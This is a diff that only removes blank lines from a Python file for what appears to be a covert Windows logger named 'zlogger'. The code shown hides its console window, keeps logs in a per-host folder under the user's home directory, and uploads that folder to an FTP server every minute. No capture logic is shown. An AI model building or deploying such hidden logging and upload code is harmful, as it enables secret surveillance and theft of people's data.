@@ -4,9 +4,7 @@ import datetime
 import netifaces
 import winreg
 import time
-
 from sync_ftp import SyncFtp
-
 import http.server
 import base64
 import socketserver
@@ -16,24 +14,20 @@ def user_name():
     user_name = str(socket.gethostname())
     return user_name
 
-
 # get the current date and time as a string
 def current_time():
     current_time = datetime.datetime.now().strftime('-%Y-%m-%d-%H-%M-%S')
     return current_time
 
-
 #For creating app dir
 def dir_path():
     home_path = os.path.expanduser("~")
     dir_name = "zlogger"
-
     dir_path = os.path.join(home_path, dir_name, user_name())
     if not os.path.exists(dir_path):
         os.makedirs(dir_path)
     os. chdir(dir_path)
     return dir_path
-
 
 # #this hide function help to minimize the console
 def hide():
@@ -41,7 +35,6 @@ def hide():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
-
 
 # check if internet is connected or not
 def is_connected():
@@ -52,7 +45,6 @@ def is_connected():
         pass
     return False
     
-
 # Define a function to get the name of an interface from its GUID
 def get_interface_name(guid):
     # Open the registry key that contains the mapping
@@ -73,12 +65,10 @@ def get_interface_name(guid):
         # If the subkey is not found, return None
         return None
 
-
 #Getting current active network interface
 def active_interface():
     active_interface = get_interface_name(netifaces.gateways()['default'][netifaces.AF_INET][1])
     return active_interface
-
 
 # Upload log directory to ftp server
 def sync():
@@ -98,9 +88,7 @@ def sync():
             print("No internet! Checking for internet connectivity..")
         time.sleep(60)
 
-
 #Creating local server
-
 class AuthHandler(http.server.SimpleHTTPRequestHandler):
     def do_HEAD(self):
         self.send_response(200)
